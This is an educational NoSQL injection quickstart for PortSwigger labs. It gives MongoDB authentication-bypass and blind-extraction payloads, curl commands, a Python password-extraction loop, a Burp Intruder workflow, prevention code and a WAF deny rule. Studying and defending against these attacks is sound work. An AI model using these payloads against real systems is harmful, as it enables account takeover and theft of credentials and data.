# NoSQL Injection Quickstart Guide

## What is NoSQL Injection?

NoSQL injection is a vulnerability that allows attackers to interfere with database queries in NoSQL systems (MongoDB, CouchDB, Redis, etc.). Unlike SQL injection, NoSQL injection exploits JSON-based query languages, JavaScript execution, and query operators.

## Attack Types

### 1. Syntax Injection
Breaking query syntax by injecting special characters and JavaScript code.

**Example:**
```javascript
// Original query
this.category == 'Gifts'

// Injected
this.category == 'Gifts' || 1 || ''  // Always true
```

### 2. Operator Injection
Injecting NoSQL query operators to manipulate logic.

**Example:**
```json
// Normal login
{"username": "admin", "password": "secret"}

// Injected
{"username": "admin", "password": {"$ne": ""}}  // Not equal to empty
```

## Quick Detection Test

**Step 1: Test for Syntax Injection**
```
URL Parameter:
category=Gifts'

Expected: Error or unexpected behavior
```

**Step 2: Test for Operator Injection**
```
JSON Body:
{"username": "admin", "password": {"$ne": ""}}

Expected: Authentication bypass
```

## Essential Payloads

### Authentication Bypass

**Method 1: $ne Operator**
```json
{
  "username": "administrator",
  "password": {"$ne": ""}
}
```

**Method 2: $regex Pattern**
```json
{
  "username": {"$regex": "admin"},
  "password": {"$ne": ""}
}
```

**Method 3: Syntax Injection**
```
username=admin'--
username=admin' || '1'=='1
```

### Data Extraction

**Boolean-Based Blind:**
```javascript
// Check password length
admin' && this.password.length < 30 || 'a'=='b

// Extract characters
admin' && this.password[0]=='a' || 'a'=='b
admin' && this.password[1]=='b' || 'a'=='b
```

**$where JavaScript Injection:**
```json
{
  "username": "admin",
  "password": "invalid",
  "$where": "this.password.length == 8"
}
```

### Schema Enumeration

**Field Discovery:**
```json
{
  "$where": "Object.keys(this)[0]"
}
```

**Field Name Extraction:**
```json
{
  "$where": "Object.keys(this)[1].match('^u')"
}
```

## Burp Suite Workflow

### 1. Intercept Request
- Burp Proxy → Intercept ON
- Submit form or request
- Send to Repeater

### 2. Test Injection
- Modify parameters with test payloads
- Try both syntax and operator injection
- Observe response differences

### 3. Automate with Intruder
- Set attack positions: `admin' && this.password[§0§]=='§a§'`
- Attack type: Cluster bomb
- Payload 1: Numbers (0-31) for position
- Payload 2: Characters (a-z) for testing
- Grep - Match: Success indicator string

### 4. Extract Data
- Sort Intruder results by "Length" or "Grep - match"
- Identify successful character matches
- Build password/token character by character

## MongoDB Operators

| Operator | Function | Injection Use |
|----------|----------|---------------|
| `$ne` | Not equal | Auth bypass |
| `$gt` | Greater than | Auth bypass |
| `$regex` | Pattern match | User enumeration |
| `$where` | JavaScript | Code execution |
| `$in` | In array | Multiple values |
| `$exists` | Field exists | Schema discovery |

## Prevention Quick Guide

### For Developers

**1. Use Parameterized Queries**
```javascript
// ❌ BAD - String concatenation
db.users.find({$where: `this.username == '${username}'`});

// ✅ GOOD - Parameterized
db.users.findOne({username: username, password: password});
```

**2. Validate Input Types**
```javascript
// ✅ GOOD - Type validation
if (typeof req.body.username !== 'string') {
  return res.status(400).send('Invalid input');
}
```

**3. Sanitize Input**
```javascript
// ✅ GOOD - Using mongo-sanitize
const sanitize = require('mongo-sanitize');
const username = sanitize(req.body.username);
```

**4. Disable JavaScript Execution**
```bash
# MongoDB configuration
mongod --noscripting
```

**5. Use ODM/ORM Frameworks**
```javascript
// ✅ GOOD - Mongoose with schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String
});
const User = mongoose.model('User', userSchema);
User.findOne({username: req.body.username});
```

### For Security Teams

**1. WAF Rules**
```
# Block MongoDB operators
SecRule REQUEST_BODY "@rx \$(?:ne|gt|where|regex)" "deny"
```

**2. Input Validation**
- Whitelist allowed characters
- Reject special characters: `$`, `{`, `}`, `'`, `"`
- Validate JSON structure

**3. Monitoring**
```bash
# Monitor for suspicious patterns
grep '$where' /var/log/webapp/access.log
grep 'Object.keys' /var/log/webapp/access.log
```

## Common Mistakes

### 1. Incomplete String Closure
```javascript
❌ Wrong: admin' && this.password[0]=='a'
// Results in syntax error

✅ Right: admin' && this.password[0]=='a' || 'x'=='y'
// Properly closed
```

### 2. Wrong Content-Type
```http
❌ Wrong: Content-Type: application/x-www-form-urlencoded
{"username": "admin"}

✅ Right: Content-Type: application/json
{"username": "admin"}
```

### 3. Not URL Encoding
```
❌ Wrong: Gifts'||1||'
✅ Right: Gifts'%7c%7c1%7c%7c'
```

## Real-World Impact

**Successful NoSQL injection allows:**
- Complete authentication bypass
- Unauthorized data access
- Sensitive data extraction (passwords, tokens)
- Account takeover
- Privilege escalation
- Schema disclosure

## Lab Practice

**PortSwigger Labs:**
1. Detecting NoSQL injection - https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection
2. Operator injection bypass - https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication
3. Data extraction - https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data
4. Unknown field extraction - https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields

## Quick Reference Commands

**Test for Injection:**
```bash
# Syntax injection
curl "http://target.com/filter?category=Gifts'%7c%7c1%7c%7c'"

# Operator injection
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'
```

**Extract Data:**
```python
import requests

# Boolean-based extraction
for i in range(8):
    for c in 'abcdefghijklmnopqrstuvwxyz':
        payload = f"admin' && this.password[{i}]=='{c}' || 'x'=='y'"
        r = requests.get(f"http://target.com/lookup?user={payload}")
        if "username" in r.text:
            print(f"Position {i}: {c}")
            break
```

## Next Steps

1. **Practice:** Complete all 4 PortSwigger labs
2. **Study:** Review full documentation for detailed techniques
3. **Tools:** Master Burp Suite Intruder for automation
4. **Read:** OWASP NoSQL Security Cheat Sheet
5. **Secure:** Implement prevention techniques in your code

## Additional Resources

- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- **OWASP Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html
- **PortSwigger Tutorial:** https://portswigger.net/web-security/nosql-injection
- **HackTricks Guide:** https://book.hacktricks.xyz/pentesting-web/nosql-injection

---

**Remember:** Always obtain proper authorization before testing. Unauthorized access is illegal.
